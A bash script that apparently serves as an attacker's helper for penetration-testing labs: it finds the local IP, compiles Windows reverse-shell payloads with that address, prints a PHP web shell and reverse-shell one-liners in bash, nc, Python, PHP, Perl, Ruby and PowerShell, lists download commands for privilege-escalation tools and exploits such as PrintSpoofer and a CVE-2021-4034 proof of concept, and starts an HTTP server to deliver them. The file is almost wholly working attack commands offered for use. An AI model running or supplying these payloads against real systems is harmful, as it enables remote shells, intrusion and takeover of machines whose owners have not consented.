#!/bin/bash

# global variables
lhost=""
lport=4444

usage() {
    echo "Usage: $0 [-c compile] [-s don't start http server] [-i <lhost>] [-p <lport>]" 1>&2;
    exit 1;
}

get_ip_address() {
    if ifconfig tun0 &> /dev/null; then
        lhost=$(ifconfig tun0 | grep "inet " | awk '{print $2}')
    elif ifconfig eth0 &> /dev/null; then
        lhost=$(ifconfig eth0 | grep "inet " | awk '{print $2}')
    elif ifconfig wlan0 &> /dev/null; then
        lhost=$(ifconfig wlan0 | grep "inet " | awk '{print $2}')
    else
        exit
    fi
}

set_payloads() {
    echo "COMPILING"
    echo "=============================================="
    sed -i "s/^#define SERVER_IP.*/#define SERVER_IP \"$lhost\"/; s/^#define SERVER_PORT.*/#define SERVER_PORT $lport/" payloads/cppdll_shell.cpp
    sed -i "s/^#define SERVER_IP.*/#define SERVER_IP \"$lhost\"/; s/^#define SERVER_PORT.*/#define SERVER_PORT $lport/" payloads/winshell.c
    x86_64-w64-mingw32-gcc payloads/cppdll_shell.cpp --shared -o payloads/cppdll_shell.dll -lws2_32
    x86_64-w64-mingw32-gcc payloads/winshell.c -o payloads/winshell.exe -lws2_32
}


# prints the list
list_stuff() {
    echo ""
    echo ""
    echo "WEBAPP"
    echo "=============================================="
    echo '<?php echo system($_GET['cmd'])?>'
    echo '<?php%20echo%20system($_GET['cmd'])?>'
    echo ""
    echo "bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$lhost%2F$lport%200%3E%261%22" # use with php above
    echo ""
    echo -n "powershell%20-enc%20"; pwsh -File payloads/create_ps_revshell.ps1 "$lhost" "$lport" # use with php above
    echo ""
    echo ""
    echo "ONE LINERS"
    echo "=============================================="
    echo "bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'"
    echo ""
    echo "nc -e /bin/bash $lhost $lport"
    echo ""
    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    echo ""
    echo -n 'php -r $sock';echo "=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");"
    echo ""
    echo "perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    echo ""
    echo "ruby -rsocket -e'f=TCPSocket.open(\"$lhost\",$lport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    echo ""
    echo ""
    echo "ACTIVE DIRECTORY"
    echo "=============================================="
    echo "iwr -uri http://$lhost/enum/PowerView.ps1 -OutFile PowerView.ps1"
    echo ""
    echo ""
    echo "PRIV ESC"
    echo "=============================================="
    echo "wget http://$lhost/enum/linpeas.sh"
    echo "wget http://$lhost/enum/LinEnum.sh"
    echo "wget http://$lhost/enum/unix-privesc-check"
    echo ""
    echo "iwr -uri http://$lhost/enum/winPEASx64.exe -OutFile winpeas.exe"
    echo "iwr -uri http://$lhost/enum/PowerUp.ps1 -OutFile PowerUp.ps1"
    echo ""
    echo "iwr -uri http://$lhost/payloads/useradd.exe -OutFile useradd.exe"
    echo "iwr -uri http://$lhost/payloads/winshell.exe -OutFile winshell.exe"
    echo ""
    echo "iwr -uri http://$lhost/payloads/cppdll_useradd.dll -OutFile cppdll_useradd.dll"
    echo "iwr -uri http://$lhost/payloads/cppdll_shell.dll -OutFile cppdll_shell.dll"
    echo ""
    echo "iwr -uri http://$lhost/exploits/PrintSpoof64.exe -OutFile PrintSpoof64.exe"
    echo "wget http://$lhost/exploits/cve-2021-4034-poc.c"
    echo ""
}

start_http_server() {
    if [[ $(ps -ef | grep "python3 -m http.server 80" | grep -v grep | wc -l) -eq 0 ]]; then
        python3 -m http.server 80
    else
        echo "HTTP server is already running"
    fi
}


custom_lhost=false
compile=false
start_python=true

# Parse arguments
while getopts ":csi:p:" opt; do
    case ${opt} in
    s )
        start_python=false
        ;;
    c )
        compile=true
        ;;
    i )
        lhost=${OPTARG}
        custom_lhost=true
        ;;
    p )
        lport=${OPTARG}
        ;;
    h|\? )
        usage
        ;;
    esac
done
shift $((OPTIND -1))

# Get interface IP if one was not set manually
if ! $custom_lhost; then
    get_ip_address
fi

if $compile; then
    set_payloads
fi

list_stuff

if $start_python; then
    start_http_server
fi